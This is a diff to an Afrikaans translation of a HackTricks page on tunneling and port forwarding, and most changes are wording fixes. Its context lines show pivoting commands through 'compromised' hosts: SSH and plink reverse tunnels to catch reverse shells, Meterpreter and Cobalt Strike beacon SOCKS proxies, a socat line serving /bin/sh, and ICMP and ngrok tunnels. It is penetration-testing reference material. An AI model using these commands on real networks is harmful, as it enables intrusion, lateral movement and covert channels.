@@ -2,19 +2,19 @@
 
 <details>
 
-<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Werk jy by 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Werk jy by 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Deel jou haktruuks deur PR's in te dien by die [hacktricks-opslagplek](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud-opslagplek](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-**Probeer Hard Security Groep**
+**Probeer Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -23,7 +23,7 @@
 ## Nmap wenk
 
 {% hint style="warning" %}
-**ICMP** en **SYN** skandeerders kan nie deur sokkiesproksi's getunnel word nie, dus moet ons **ping-ontdekking uitskakel** (`-Pn`) en spesifiseer **TCP-skandeerders** (`-sT`) vir hierdie om te werk.
+**ICMP** en **SYN** skanderings kan nie deur sokkiesproksi's getunnel word nie, dus moet ons **ping-ontdekking uitskakel** (`-Pn`) en spesifiseer **TCP-skanderings** (`-sT`) vir hierdie doel.
 {% endhint %}
 
 ## **Bash**
@@ -50,7 +50,7 @@ SSH grafiese verbinding (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
-### Plaaslike Poort-tot-Poort
+### Plaaslike Poort-na-Poort
 
 Maak 'n nuwe poort oop in SSH-bediener --> Ander poort
 ```bash
@@ -70,13 +70,13 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Poort2gasheer (proxychains)
 
-Plaaslike Poort --> Gehackte gasheer (SSH) --> Waar ook al
+Plaaslike Poort --> Gehackte gasheer (SSH) --> Waarookal
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
 ### Omgekeerde Poort Deurstuur
 
-Dit is nuttig om omgekeerde skulpe van interne gasheer deur 'n DMZ na jou gasheer te kry:
+Dit is nuttig om omgekeerde shells te verkry van interne gasheer deur 'n DMZ na jou gasheer:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
@@ -97,12 +97,12 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Aktiveer deurstuur op die Bedienerkant
+Aktiveer deurstuur op die Bedienerkant.
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
-Stel 'n nuwe roete aan die kliëntkant in
+Stel 'n nuwe roete aan die kliëntkant in.
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
@@ -114,7 +114,7 @@ Byvoorbeeld, stuur al die verkeer wat na 10.10.10.0/24 gaan.
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-Maak 'n verbinding met 'n privaatsleutel.
+Maak 'n verbinding met 'n privaatsleutel
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
@@ -123,14 +123,14 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Poort-tot-poort
 
-Lokale poort --> Gehackte gasheer (aktiewe sessie) --> Derde\_kas:Poort
+Plaaslike poort --> Gehackte gasheer (aktiewe sessie) --> Derde\_kas:Poort
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-### SOCKS
+SOCKS (Socket Secure) is 'n protokol wat gebruik word om 'n privaat skakel tussen rekenaars te skep. Dit kan gebruik word vir anonimiteit en om deur vuremuure te beweeg.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -142,11 +142,11 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 #### Tunneling
 
-Tunneling is a method that allows data to be transferred securely over a public network. It involves encapsulating the data into another protocol to create a secure communication channel. This can be useful for bypassing network restrictions or accessing resources securely.
+Tunneling is a method that allows data to be transferred securely over a public network. It involves encapsulating the data in another protocol to create a secure communication channel. This can be useful for bypassing network restrictions or securely accessing resources on a remote network.
 
 #### Port Forwarding
 
-Port forwarding is a technique that redirects a communication request from one address and port number combination to another. It is commonly used to allow external devices to access services on a private network. Port forwarding can be set up on routers to enable access to specific services running on internal network devices.
+Port forwarding is a technique that allows a computer's services to be accessed from the internet. It involves redirecting specific network traffic from one port to another, typically used to expose services running on a local machine to the internet. Port forwarding can be used for remote access, gaming, or hosting services.
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -163,7 +163,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Maak 'n poort oop in die spanbediener wat luister op al die koppelvlakke wat gebruik kan word om die verkeer deur die vuurpyl te roeteer.
+Maak 'n poort oop in die spanbediener wat luister op al die koppelvlakke wat gebruik kan word om die verkeer deur die baken te roeteer.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -171,10 +171,10 @@ beacon> socks 1080
 # Set port 1080 as proxy server in proxychains.conf
 proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ```
-### rPoort2Poort
+### rPort2Port
 
 {% hint style="warning" %}
-In hierdie geval word die **poort oopgemaak in die bakenserver**, nie in die Spanbediener nie, en die verkeer word gestuur na die Spanbediener en vandaar na die aangeduide gasheer:poort
+In hierdie geval is die **poort oopgemaak in die bakenserver**, nie in die Spanbediener nie, en die verkeer word gestuur na die Spanbediener en vandaar na die aangeduide gasheer:poort
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -183,7 +183,7 @@ rportfwd stop [bind port]
 ### rPort2Port plaaslik
 
 {% hint style="warning" %}
-In hierdie geval word die **poort oopgemaak in die bakenserver**, nie in die Spanbediener nie en die **verkeer word gestuur na die Cobalt Strike-klient** (nie na die Spanbediener nie) en vandaar na die aangeduide gasheer:poort
+In hierdie geval word die **poort oopgemaak in die bakenserver**, nie in die Spanbediener nie, en die **verkeer word gestuur na die Cobalt Strike-kliënt** (nie na die Spanbediener nie) en vandaar na die aangeduide gasheer:poort.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -293,7 +293,7 @@ chmod 600 $FILENAME.key $FILENAME.pem
 attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
 victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
 ```
-### Remote Port2Port
+### Remote Poort-na-Poort
 
 Verbind die plaaslike SSH-poort (22) met die 443-poort van die aanvaller se gasheer.
 ```bash
@@ -303,9 +303,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Dit is soos 'n konsolideerde PuTTY-weergawe (die opsies is baie soortgelyk aan 'n ssh-kliënt).
+Dit is soos 'n konsolideerder PuTTY weergawe (die opsies is baie soortgelyk aan 'n ssh-klient).
 
-Aangesien hierdie binêre lêer op die slagoffer uitgevoer sal word en dit 'n ssh-kliënt is, moet ons ons ssh-diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs plaaslik toeganklike poort na 'n poort op ons masjien deur te stuur:
+Aangesien hierdie binêre lêer op die slagoffer uitgevoer sal word en dit 'n ssh-klient is, moet ons ons ssh-diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs plaaslik toeganklike poort na 'n poort op ons masjien deur te stuur:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -329,10 +329,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Jy moet **RDP-toegang oor die stelsel** hê.\
 Aflaai:
 
-1. [SocksOverRDP x64 Binêre lêers](https://github.com/nccgroup/SocksOverRDP/releases) - Hierdie instrument gebruik `Dinamiese Virtuele Kanale` (`DVC`) van die Verre Desktopdiensfunksie van Windows. DVC is verantwoordelik vir **tunneling pakkies oor die RDP-verbinding**.
+1. [SocksOverRDP x64 Binêre lêers](https://github.com/nccgroup/SocksOverRDP/releases) - Hierdie instrument gebruik `Dinamiese Virtuele Kanale` (`DVC`) van die Verrekenaarbedienerdiensfunksie van Windows. DVC is verantwoordelik vir **tunneling pakkies oor die RDP-verbinding**.
 2. [Proxifier Draagbare Binêre lêer](https://www.proxifier.com/download/#win-tab)
 
-Laai op jou kliëntrekenaar **`SocksOverRDP-Plugin.dll`** soos dit:
+Laai **`SocksOverRDP-Plugin.dll`** op jou kliëntrekenaar soos hierdie:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
@@ -343,11 +343,11 @@ Nou kan ons **verbind** met die **slagoffer** oor **RDP** deur **`mstsc.exe`** t
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Bevestig nou op jou masjien (aanvaller) dat poort 1080 luister:
+**Bevestig nou op jou masjien (aanvaller) dat poort 1080 aan die luister is:**
 ```
 netstat -antb | findstr 1080
 ```
-Nou kan jy [**Proxifier**](https://www.proxifier.com/) gebruik **om die verkeer deur daardie poort te proxy.**
+Nou kan jy **[Proxifier](https://www.proxifier.com/)** gebruik **om die verkeer deur daardie poort te proxy.**
 
 ## Proxify Windows GUI Apps
 
@@ -375,7 +375,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Nou, as jy byvoorbeeld in die slagoffer die **SSH**-diens instel om na port 443 te luister. Jy kan daarmee verbind deur die aanvaller se poort 2222.\
+Nou, as jy byvoorbeeld die **SSH**-diens in die slagoffer instel om na port 443 te luister. Jy kan daarmee verbind deur die aanvaller se poort 2222.\
 Jy kan ook 'n **meterpreter** gebruik wat na localhost:443 verbind en die aanvaller luister na poort 2222.
 
 ## YARP
@@ -425,20 +425,20 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Verander proxychains DNS
 
-Proxychains onderskep die `gethostbyname` libc-oproep en stuur tcp DNS-versoeke deur die socks-proksi. Standaard gebruik proxychains die DNS-bediener **4.2.2.2** (hardgekoppel). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows-omgewing** is, kan jy die IP van die **domeinbeheerder** instel.
+Proxychains onderskep die `gethostbyname` libc-oproep en stuur tcp DNS-versoeke deur die socks-proksi. Standaard gebruik proxychains die DNS-bediener **4.2.2.2** (hardgekoeër). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows-omgewing** is, kan jy die IP van die **domeinbeheerder** instel.
 
 ## Tonnels in Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## ICMP-tonneling
+## ICMP Tonneling
 
 ### Hans
 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root is nodig in beide stelsels om tonnel-adaptere te skep en data tussen hulle te stuur deur gebruik te maak van ICMP-echoversoeke.
+Root is nodig in beide stelsels om tonnel-adaptere te skep en data tussen hulle te tonnel met behulp van ICMP-echoversoeke.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -462,8 +462,8 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-**[ngrok](https://ngrok.com/) is 'n instrument om oplossings bloot te stel aan die Internet in een opdragreël.**
-*Blootstellings URI is soos:* **UID.ngrok.io**
+**[ngrok](https://ngrok.com/) is 'n gereedskap om oplossings aan die internet bloot te stel in een opdragreël.**
+*Uitstal URI is soos:* **UID.ngrok.io**
 
 ### Installasie
 
@@ -481,7 +481,7 @@ chmod a+x ./ngrok
 
 *Dit is ook moontlik om verifikasie en TLS by te voeg, indien nodig.*
 
-#### Tonneling TCP
+#### Tunneling TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -499,14 +499,14 @@ chmod a+x ./ngrok
 *Handig vir XSS, SSRF, SSTI ...*
 Direk vanaf stdout of in die HTTP-koppelvlak [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
-#### Tonneling interne HTTP-diens
+#### Tunneling interne HTTP-diens
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 # With basic auth
 ./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
 ```
-#### ngrok.yaml eenvoudige konfigurasievoorbeeld
+#### ngrok.yaml eenvoudige konfigurasie voorbeeld
 
 Dit maak 3 tonnels oop:
 - 2 TCP
@@ -530,7 +530,7 @@ addr: file:///tmp/httpbin/
 
 **Probeer Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
